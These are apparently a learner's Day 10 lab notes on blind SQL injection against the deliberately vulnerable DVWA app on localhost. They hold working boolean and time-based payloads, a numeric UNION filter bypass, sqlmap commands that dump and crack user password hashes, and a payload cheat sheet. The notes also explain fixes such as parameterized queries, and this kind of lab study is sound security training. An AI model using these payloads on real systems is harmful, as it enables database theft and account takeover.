# Day 10 Notes — Blind SQL Injection + sqlmap Automation

---

## 1. What We Did Today Overview

- Understood the difference between normal and blind SQL injection
- Exploited boolean-based blind SQLi manually on DVWA
- Confirmed time-based blind SQLi using SLEEP()
- Installed and ran sqlmap to automate the full attack
- Bypassed Medium security by exploiting client-side controls through Burp

---

## 2. Normal SQLi vs Blind SQLi

### Normal SQLi (what we did on Day 9)
The app shows you the query output directly on the page. You inject UNION SELECT and the data appears right there in the response. Fast, easy to read, easy to exploit.

### Blind SQLi (today)
The app is still vulnerable but **shows you nothing.** No data output, no errors. The only feedback you get is how the page behaves — does it show "exists" or "missing"? Does it respond fast or slow?

You can't extract data directly. Instead you ask the database true/false questions and infer the data one character at a time from the page's behavior.

### Why blind SQLi exists in the real world
Most real applications don't show database output on the page. Developers often suppress errors and output for security. But suppressing output doesn't fix the underlying injection — the vulnerability is still there, just harder to exploit. This is why blind SQLi is extremely common in real bug bounty findings.

---

## 3. Boolean-Based Blind SQLi

### How it works
You inject a condition into the query. If the condition is TRUE the page behaves one way. If FALSE it behaves another way. By testing conditions about the data you extract it character by character.

### What we used on DVWA
DVWA Blind SQLi page only says:
- **"User ID exists"** → your condition was TRUE
- **"User ID is MISSING"** → your condition was FALSE

That single bit of information — exists vs missing — is enough to extract the entire database.

### Step by step what we did

**Confirm normal behavior:**
```
1    → User ID exists
2    → User ID exists
3    → User ID exists
```

**Confirm injection is possible:**
```
1' AND '1'='1#    → User ID exists   (true condition)
1' AND '1'='2#    → User ID is MISSING   (false condition)
```
Page behavior changed based on our SQL condition. Blind boolean SQLi confirmed.

**Extract database name character by character:**
```
1' AND SUBSTRING(database(),1,1)='d'#    → User ID exists  ✓  first char is 'd'
1' AND SUBSTRING(database(),2,1)='v'#    → User ID exists  ✓  second char is 'v'
1' AND SUBSTRING(database(),3,1)='w'#    → User ID exists  ✓  third char is 'w'
1' AND SUBSTRING(database(),4,1)='a'#    → User ID exists  ✓  fourth char is 'a'
```
Database name = `dvwa` — extracted one character at a time.

### What SUBSTRING() does
```sql
SUBSTRING(string, start_position, length)
```
- `SUBSTRING(database(),1,1)` = get 1 character starting at position 1 of the database name
- `SUBSTRING(database(),2,1)` = get 1 character starting at position 2
- You move through the string one position at a time testing each character

### Why this is painfully slow manually
To extract just the database name `dvwa` you need 4 queries minimum. To extract a password hash of 32 characters you need 32 queries minimum — times however many possible characters per position. A full database extraction manually could take thousands of queries. This is exactly why sqlmap exists.

---

## 4. Time-Based Blind SQLi

### How it works
When even the page behavior gives nothing away — same response for true and false — you use time as your signal. Inject a SLEEP() command that only executes when your condition is true. If the page takes exactly X seconds to respond your condition was true.

### What we tested
```
1' AND SLEEP(5)#
```
Page took exactly 5 seconds to respond → time-based blind SQLi confirmed. The database executed our SLEEP() command.

### Why this works
The query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5)#'
```
The database evaluates `user_id = '1'` first — it's true — so it evaluates the AND condition next which is `SLEEP(5)` — pauses 5 seconds — then returns the result.

If user ID 1 didn't exist the AND short-circuits and SLEEP never executes — page responds instantly. That timing difference is your true/false signal.

### Boolean vs Time-based — when to use which

| | Boolean-based | Time-based |
|---|---|---|
| Signal | Page content changes | Response time changes |
| Speed | Faster | Slower |
| When to use | When page shows different content for true/false | When page always looks identical |
| Detection risk | Lower | Higher — causes obvious delays |

---

## 5. sqlmap — Automated SQL Injection

### What is sqlmap
sqlmap is an open source penetration testing tool that automates SQL injection detection and exploitation completely. It detects vulnerable parameters, identifies the database type, and extracts data — doing automatically in seconds what we did manually over hours across Day 9 and Day 10.

It is pre-installed on Kali Linux. Confirm with:
```bash
sqlmap --version
```
If missing for any reason:
```bash
sudo apt install sqlmap -y
```

---

### Step 1 — Get your session cookie from Burp

DVWA requires you to be logged in to access vulnerable pages. sqlmap runs from the terminal — it has no browser session. You need to give it your cookie manually so it can authenticate as you.

**How to get it:**
1. Open Burp → HTTP History tab
2. Click any recent DVWA request
3. Find the Cookie header in the request:
```
Cookie: PHPSESSID=ijqukc1alc70a0d1lt6mi07tn4; security=low
```
4. Copy the entire value — you'll paste this into every sqlmap command

**Why both parts of the cookie matter:**
- `PHPSESSID=...` → proves you are logged in as admin
- `security=low` → tells DVWA which security level to apply

If you change security level in DVWA and run sqlmap again — update this cookie value or sqlmap will be testing the wrong security level.

---

### Step 2 — Enumerate all databases

This is always the first sqlmap command. You're asking "what databases exist on this server?"

```bash
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ijqukc1alc70a0d1lt6mi07tn4; security=low" --dbs
```

**Every flag explained:**

| Flag | What it does |
|---|---|
| `-u "URL"` | The target URL to test. Must include a parameter sqlmap can test — here it's `id=1` |
| `--cookie="..."` | Passes your session cookie so sqlmap is authenticated |
| `--dbs` | After finding injection, enumerate all database names on the server |

**What sqlmap does when you run this:**
1. Sends the URL as-is and records the normal response
2. Starts injecting test payloads into the `id=` parameter automatically
3. Tests boolean payloads, error-based payloads, UNION payloads, time-based payloads
4. Identifies which technique works
5. Identifies the database type (MariaDB/MySQL in our case)
6. Uses the working technique to run `SHOW DATABASES` equivalent
7. Prints all database names

**sqlmap prompts during this run and how to answer:**
```
it looks like the back-end DBMS is MySQL        → y   (confirm)
do you want to skip test payloads               → n   (test everything)
do you want to keep testing the others          → n   (one working technique is enough)
```
For anything else → press Enter to accept the default.

**Output you'll see:**
```
available databases [2]:
[*] dvwa
[*] information_schema
```

---

### Step 3 — Enumerate tables inside dvwa database

Now you know `dvwa` exists. Find out what tables are inside it:

```bash
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ijqukc1alc70a0d1lt6mi07tn4; security=low" -D dvwa --tables
```

**New flags:**

| Flag | What it does |
|---|---|
| `-D dvwa` | Target specifically the `dvwa` database |
| `--tables` | List all tables inside that database |

**Output:**
```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```
Same tables we found manually — `guestbook` and `users`.

---

### Step 4 — Enumerate columns inside users table

Before dumping data you want to know exactly what columns exist:

```bash
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ijqukc1alc70a0d1lt6mi07tn4; security=low" -D dvwa -T users --columns
```

**New flags:**

| Flag | What it does |
|---|---|
| `-T users` | Target specifically the `users` table |
| `--columns` | List all columns and their data types |

**Output:**
```
Database: dvwa
Table: users
[6 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| user_id   | int(6)       |
| first_name| varchar(15)  |
| last_name | varchar(15)  |
| user      | varchar(15)  |
| password  | varchar(32)  |
| avatar    | varchar(70)  |
+-----------+--------------+
```

Now you can see `password` is `varchar(32)` — exactly 32 characters — which confirms MD5 hashing (MD5 always produces 32 hex characters).

---

### Step 5 — Dump the full users table

```bash
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ijqukc1alc70a0d1lt6mi07tn4; security=low" -D dvwa -T users --dump
```

**New flag:**

| Flag | What it does |
|---|---|
| `--dump` | Extract and display all rows and columns from the target table |

**What happens during the run:**
1. sqlmap extracts all rows from the users table
2. It detects that the `password` column contains MD5 hashes
3. It asks: "do you want to crack them via a dictionary-based attack?" → type `y`
4. sqlmap runs its built-in wordlist against the hashes
5. Displays a clean formatted table with cracked passwords inline

**Final output — clean formatted table:**
```
Database: dvwa
Table: users
[5 entries]
+---------+---------+----------------------------------+----------+
| user_id | user    | password                         | cracked  |
+---------+---------+----------------------------------+----------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 | abc123   |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | charley  |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein  |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
+---------+---------+----------------------------------+----------+
```
Completed in 5-10 seconds total.

---

### Step 6 — Run sqlmap on Blind SQLi page

sqlmap works on blind SQLi too — it just uses different techniques automatically:

```bash
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=ijqukc1alc70a0d1lt6mi07tn4; security=low" --dbs --level=2
```

**New flag:**

| Flag | What it does |
|---|---|
| `--level=2` | Test more payload variations including blind techniques — default is 1 |

Notice the URL changed to `sqli_blind` — this is the blind SQLi page where no output is shown. sqlmap automatically detects it's blind and switches to boolean or time-based techniques. Watch the terminal output — you'll see it testing the exact same SUBSTRING() conditions we ran manually, just thousands of times per second.

---

### What sqlmap is doing under the hood
sqlmap is running all the same payloads we ran manually but:
- Tests hundreds of injection techniques automatically
- Handles URL encoding automatically — no manual `%20` or `+`
- Identifies the exact database type and uses database-specific syntax
- Switches between UNION, boolean, error-based, and time-based techniques automatically
- Has a built-in wordlist for cracking common hashes

The manual approach we learned first is still essential — it teaches you what sqlmap is doing and lets you understand results. In real bug bounty you do manual first to confirm injection, then use sqlmap to speed up extraction.

---

### Full sqlmap command reference

```bash
# check version
sqlmap --version

# enumerate databases
sqlmap -u "URL" --cookie="COOKIE" --dbs

# enumerate tables in a database
sqlmap -u "URL" --cookie="COOKIE" -D database_name --tables

# enumerate columns in a table
sqlmap -u "URL" --cookie="COOKIE" -D database_name -T table_name --columns

# dump entire table
sqlmap -u "URL" --cookie="COOKIE" -D database_name -T table_name --dump

# dump entire database
sqlmap -u "URL" --cookie="COOKIE" -D database_name --dump-all

# blind SQLi with higher test level
sqlmap -u "URL" --cookie="COOKIE" --dbs --level=2

# more aggressive testing
sqlmap -u "URL" --cookie="COOKIE" --dbs --level=3 --risk=2
```

---

## 6. Bypassing Medium Security — Client vs Server Side

### What changed on Medium security
Go to DVWA Security → change to **Medium** → Submit. Then go back to SQL Injection.

The text input box is **gone.** It's been replaced with a **dropdown menu** with pre-defined values (1, 2, 3, 4, 5). The developer thought: "if I only let users pick from a dropdown they can't type in a payload."

This is called **client-side security** — the restriction only exists in the browser UI.

---

### Step by step — how we bypassed it

**Step 1 — Turn Intercept ON in Burp**

**Step 2 — Select any value from the dropdown** (e.g. select "1") → click Submit

**Step 3 — Request freezes in Burp.** Look at it carefully:
```
POST /vulnerabilities/sqli/ HTTP/1.1
Host: 127.0.0.1
...
id=1&Submit=Submit
```
The dropdown value is just `id=1` in the POST body. The server has no idea it came from a dropdown — it just sees a parameter called `id` with value `1`. Exactly the same as the Low security text box.

**Step 4 — Right click → Send to Repeater → Forward → Intercept OFF**

**Step 5 — In Repeater find `id=1` in the request body**

**Step 6 — The apostrophe filter.** Try typing the Low security payload:
```
id=1' UNION SELECT user,password FROM users#
```
URL encode it → Send → you'll get an error or empty result. Medium security strips the `'` apostrophe server-side. The filter is real this time — it's server-side, not just UI.

**Step 7 — Bypass with numeric injection — no apostrophe needed:**
```
id=1 UNION SELECT user,password FROM users#
```
URL encode → Send → full dump appears in the response.

**Why this works without an apostrophe:**
The original query on Low security was:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```
The `'` quotes around `$id` make it a string comparison. On Medium the developer added `'` filtering — but forgot to add proper parameterized queries. The query on Medium is actually:
```sql
SELECT first_name, last_name FROM users WHERE user_id = $id
```
No quotes around the variable — it's now a numeric comparison. That means you never needed apostrophes in the first place. Your UNION payload just appends directly:
```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT user,password FROM users#
```
Perfectly valid SQL. Full dump achieved.

---

### Why the dropdown bypass works — the core concept

The browser enforces the dropdown restriction. The server never checks where the value came from. The flow is:

```
Browser shows dropdown (UI restriction)
        ↓
User selects value 1
        ↓
Browser sends: id=1&Submit=Submit
        ↓
Burp intercepts BEFORE it reaches the server
        ↓
We change id=1 to id=1 UNION SELECT...
        ↓
Modified request reaches server
        ↓
Server processes id= exactly like before
        ↓
Full dump returned
```

The dropdown never had any power. It was a lock on a door with no walls.

---

### What would actually fix Medium security
The dropdown alone fixes nothing. What would actually protect it:
1. **Parameterized queries** — separate SQL structure from user data entirely
2. **Server-side whitelist validation** — check that `id` is a number between 1-5 on the server, not in the browser
3. **Both together** — defense in depth

---

### Client-side vs server-side security — full comparison

| | Client-side | Server-side |
|---|---|---|
| Where it runs | In the user's browser | On the web server |
| Can be bypassed | Yes — always, with Burp | Much harder |
| Examples of controls | Dropdown menus, disabled input fields, JS form validation, hidden fields, max length on inputs | Parameterized queries, WAF rules, server-side input validation, authentication checks |
| Should you trust it | Never | Yes |
| Time to bypass | Seconds with Burp | Requires real vulnerability |

**The golden rule of web security: never trust the client.** Every security control must live on the server. Anything enforced only in the browser — dropdowns, JavaScript validation, disabled buttons, hidden fields, max-length attributes — can be bypassed instantly with Burp by modifying the raw HTTP request. The server must validate everything independently as if the browser doesn't exist.

---

## 7. The Full Attack Chain We Now Know

```
Discover SQLi with '
        ↓
Confirm with OR '1'='1
        ↓
Find columns with ORDER BY
        ↓
UNION attack → extract version, db name, tables, columns
        ↓
Dump users table → get hashes
        ↓
Crack hashes on crackstation.net
        ↓
Full account compromise
```

Or with sqlmap — all of the above in one command in 10 seconds.

---

## 8. Key Concepts Summary

| Term | Meaning |
|---|---|
| Blind SQLi | Injection where no data is shown — infer results from page behavior |
| Boolean-based | True condition = page shows one thing, false = another |
| Time-based | True condition = page delays by SLEEP(X) seconds |
| SUBSTRING() | Extracts characters from a string one position at a time |
| SLEEP() | Pauses database execution — used to confirm time-based blind SQLi |
| sqlmap | Tool that automates SQLi detection and exploitation |
| `--dbs` | sqlmap flag to enumerate all databases |
| `--dump` | sqlmap flag to extract all data from a table |
| Client-side security | Controls in the browser — always bypassable |
| Server-side security | Controls on the server — the only real security |
| Numeric injection | SQLi without apostrophes — works when filtering blocks `'` |

---

## 9. Payloads Cheat Sheet

**Boolean blind:**
```sql
1' AND '1'='1#                              -- true condition
1' AND '1'='2#                              -- false condition
1' AND SUBSTRING(database(),1,1)='d'#       -- extract first char of db name
1' AND SUBSTRING(database(),2,1)='v'#       -- extract second char
```

**Time-based blind:**
```sql
1' AND SLEEP(5)#                            -- confirm time-based blind SQLi
```

**sqlmap commands:**
```bash
# enumerate databases
sqlmap -u "URL" --cookie="COOKIE" --dbs

# dump specific table
sqlmap -u "URL" --cookie="COOKIE" -D database_name -T table_name --dump

# blind SQLi with higher level
sqlmap -u "URL" --cookie="COOKIE" --dbs --level=2
```

**Medium security bypass (numeric, no apostrophe):**
```sql
1 UNION SELECT user,password FROM users#
```

---

*Day 10 complete. You now understand both normal and blind SQL injection, can automate attacks with sqlmap, and know why client-side security controls are worthless. Tomorrow is Day 11 — Brute Force attacks using Burp Intruder.*
